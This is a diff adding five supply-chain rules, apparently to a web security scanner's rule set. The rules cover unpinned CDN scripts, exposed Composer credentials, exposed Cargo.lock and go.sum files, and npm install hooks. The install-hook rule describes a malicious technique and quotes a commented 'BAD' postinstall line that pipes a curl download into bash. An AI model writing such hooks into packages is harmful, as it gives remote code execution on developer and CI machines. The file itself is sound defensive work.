@@ -236,5 +236,153 @@
     ],
     "cwe": "CWE-538",
     "owasp": "A05:2021"
+  },
+  {
+    "id": "supply-chain-cdn-script-unpinned-version",
+    "type": "body-pattern",
+    "title": "CDN Script With No Version Pin and No Integrity Hash",
+    "category": "supply-chain",
+    "severity": "medium",
+    "description": "A script is loaded from jsdelivr's npm alias or unpkg with no version number in the URL (or an explicit @latest) and no integrity attribute. Requesting the same URL tomorrow can return different bytes with nothing to catch the change.",
+    "evidence": "CDN script URL with no version segment and no integrity attribute detected.",
+    "riskImpact": "Without a pinned version, the file served from the CDN can change at any time: a new release, a compromised package pushed by the upstream maintainer's account, or a CDN-level substitution. With no SRI hash either, the browser has no way to detect that the code it just executed is not the code you tested.",
+    "explanation": "jsdelivr's /npm/ alias and unpkg both resolve a package path with no @version to whatever the latest published release is at request time. That is convenient during development but means production visitors can silently receive a different file than the one you reviewed, and there is no integrity check to catch a malicious or broken substitution.",
+    "fixSteps": [
+      "Pin every jsdelivr/unpkg script URL to an exact version, e.g. /npm/lodash@4.17.21/lodash.min.js instead of /npm/lodash/lodash.min.js.",
+      "Add an integrity attribute with the SRI hash for that exact pinned version.",
+      "Bump the pinned version deliberately (and regenerate the hash) as part of a reviewed change, not automatically.",
+      "Consider self-hosting the script if it changes rarely, removing the CDN dependency entirely."
+    ],
+    "codeExamples": [
+      {
+        "label": "Pinned version with SRI hash",
+        "language": "html",
+        "code": "<!-- BAD: resolves to whatever is newest right now -->\n<script src=\"https://cdn.jsdelivr.net/npm/lodash/lodash.min.js\"></script>\n\n<!-- GOOD: exact version, verified with SRI -->\n<script\n  src=\"https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js\"\n  integrity=\"sha384-abc123...\"\n  crossorigin=\"anonymous\"\n></script>"
+      }
+    ],
+    "references": [
+      "https://www.jsdelivr.com/documentation#id-npm",
+      "https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity"
+    ],
+    "cwe": "CWE-829",
+    "owasp": "A08:2021"
+  },
+  {
+    "id": "supply-chain-composer-auth-json-exposed",
+    "type": "body-pattern",
+    "title": "PHP Composer auth.json Exposed With Registry Credentials",
+    "category": "supply-chain",
+    "severity": "critical",
+    "description": "A Composer auth.json file was found publicly accessible with a live http-basic password or OAuth token, not just placeholder values. This file grants access to private package repositories and, for a GitHub/GitLab token, to the linked account's API.",
+    "evidence": "Composer auth.json exposed with a non-placeholder credential value.",
+    "riskImpact": "An exposed http-basic credential grants direct access to whatever private Composer repository it authenticates. An exposed github-oauth or gitlab-token value is a real personal access token: depending on its scopes, an attacker can read private repositories, push commits, or publish packages under the victim's account.",
+    "explanation": "auth.json holds the credentials Composer uses to reach private package repositories, split out from composer.json specifically so it can be gitignored and kept off the server. When it ends up in the web root anyway, the credentials inside it are as exposed as if they were printed on the homepage.",
+    "fixSteps": [
+      "Remove auth.json from the web root immediately.",
+      "Revoke and rotate every credential the file contained: http-basic passwords and GitHub/GitLab/Bitbucket tokens.",
+      "Set COMPOSER_AUTH as an environment variable in CI/CD instead of committing or deploying auth.json.",
+      "Add auth.json to .gitignore and block dotfiles at the web server level as defense-in-depth."
+    ],
+    "codeExamples": [
+      {
+        "label": "Use an environment variable instead of a deployed auth.json",
+        "language": "bash",
+        "code": "# Never deploy auth.json. In CI/CD:\nexport COMPOSER_AUTH='{\"github-oauth\":{\"github.com\":\"'\"$GITHUB_TOKEN\"'\"}}'\ncomposer install --no-dev"
+      }
+    ],
+    "references": [
+      "https://getcomposer.org/doc/articles/http-basic-authentication.md",
+      "https://getcomposer.org/doc/articles/authentication-for-private-packages.md"
+    ],
+    "cwe": "CWE-538",
+    "owasp": "A05:2021"
+  },
+  {
+    "id": "supply-chain-cargo-lock-exposed",
+    "type": "body-pattern",
+    "title": "Rust Cargo.lock Exposed",
+    "category": "supply-chain",
+    "severity": "medium",
+    "description": "A Cargo.lock file was found publicly accessible. Rust's lock file pins the exact version and source of every crate in the dependency tree, including transitive dependencies not listed in Cargo.toml.",
+    "evidence": "Rust Cargo.lock exposed at public URL.",
+    "riskImpact": "Exact crate versions let an attacker cross-reference RustSec's advisory database for known vulnerabilities without any guessing, the same reconnaissance shortcut an exposed package-lock.json or Gemfile.lock provides for other ecosystems.",
+    "explanation": "Cargo.lock is meant to travel with the source repository for reproducible builds, not to be served by the compiled web application. It normally ends up web-accessible only when a build's output directory is set to the project root instead of a dedicated public/dist folder.",
+    "fixSteps": [
+      "Block access to Cargo.lock in your web server or reverse proxy configuration.",
+      "Verify your deployment copies only the compiled build output, not the full repository checkout, to the web root.",
+      "Audit for other Rust project files (Cargo.toml, src/) that may be similarly exposed."
+    ],
+    "codeExamples": [
+      {
+        "label": "Nginx deny rule",
+        "language": "nginx",
+        "code": "location ~* /(Cargo\\.(lock|toml))$ {\n  deny all;\n  return 404;\n}"
+      }
+    ],
+    "references": [
+      "https://doc.rust-lang.org/cargo/guide/cargo-toml-vs-cargo-lock.html",
+      "https://rustsec.org/"
+    ],
+    "cwe": "CWE-200",
+    "owasp": "A05:2021"
+  },
+  {
+    "id": "supply-chain-go-sum-exposed",
+    "type": "body-pattern",
+    "title": "Go go.sum Checksum File Exposed",
+    "category": "supply-chain",
+    "severity": "medium",
+    "description": "A go.sum file was found publicly accessible with multiple module checksum entries. This file lists every module in the build, including indirect dependencies, along with the exact version resolved for each.",
+    "evidence": "Go go.sum file exposed with module checksum lines at public URL.",
+    "riskImpact": "Exact module versions let an attacker check the Go vulnerability database (govulncheck/OSV) for applicable CVEs in the resolved dependency tree, including indirect modules that never appear in go.mod.",
+    "explanation": "go.sum is a build-time artifact that should live in the source repository, not the web root. It typically becomes reachable when a container image or deployment copies the whole module directory instead of just the compiled binary.",
+    "fixSteps": [
+      "Block access to go.sum and go.mod in your web server configuration.",
+      "Use a multi-stage Docker build so the final image contains only the compiled binary, not the Go module cache or source tree.",
+      "Verify your deployment artifact doesn't include the repository checkout."
+    ],
+    "codeExamples": [
+      {
+        "label": "Multi-stage Docker build excludes source/module files from the final image",
+        "language": "dockerfile",
+        "code": "FROM golang:1.22 AS build\nWORKDIR /src\nCOPY . .\nRUN go build -o /app ./cmd/server\n\nFROM gcr.io/distroless/base-debian12\nCOPY --from=build /app /app\n# go.sum, go.mod, and source files never reach this final image\nENTRYPOINT [\"/app\"]"
+      }
+    ],
+    "references": [
+      "https://go.dev/ref/mod#go-sum-files",
+      "https://go.dev/security/vuln/"
+    ],
+    "cwe": "CWE-200",
+    "owasp": "A05:2021"
+  },
+  {
+    "id": "supply-chain-malicious-install-script",
+    "type": "body-pattern",
+    "title": "npm Install Hook Pipes a Remote Download Into a Shell",
+    "category": "supply-chain",
+    "severity": "critical",
+    "description": "A publicly accessible package.json has a preinstall, install, or postinstall script that downloads a remote file with curl or wget and pipes it directly into a shell interpreter. This is a known technique used by malicious/compromised npm packages to run arbitrary code the moment the package is installed.",
+    "evidence": "package.json install hook pipes a curl/wget download into a shell interpreter.",
+    "riskImpact": "npm install hooks run automatically, with no confirmation, on every machine that installs the package: developer laptops and CI/CD runners alike. A remote script piped straight into bash gives whoever controls that URL arbitrary code execution the moment `npm install` runs, and the served script can differ from whatever was reviewed at publish time.",
+    "explanation": "Legitimate install hooks that need to fetch platform-specific binaries almost always do so through a local script (e.g. `node install.js`) that can validate what it downloads before running anything. A one-line `curl ... | sh` in the scripts block skips that entirely: whatever the URL returns executes immediately and unreviewed.",
+    "fixSteps": [
+      "Treat this package.json as compromised: do not run npm install against it until the script is investigated.",
+      "If this is your own package, replace the curl/wget-to-shell one-liner with a local install script that downloads to a file, verifies a checksum, and only then executes it.",
+      "Audit package-lock.json/npm registry history for when this script was introduced and who published it.",
+      "Rotate any credentials available to CI/CD runners or developer machines that may have already run this install hook."
+    ],
+    "codeExamples": [
+      {
+        "label": "Verify before executing instead of piping straight into a shell",
+        "language": "json",
+        "code": "// BAD: whatever the URL returns runs immediately, unreviewed\n// \"postinstall\": \"curl -sL https://example.com/setup.sh | bash\"\n\n// GOOD: local script downloads to a file, checks it, then runs it\n// \"postinstall\": \"node scripts/postinstall.js\""
+      }
+    ],
+    "references": [
+      "https://owasp.org/www-community/vulnerabilities/",
+      "https://docs.npmjs.com/cli/v10/using-npm/scripts"
+    ],
+    "cwe": "CWE-506",
+    "owasp": "A08:2021"
   }
 ]
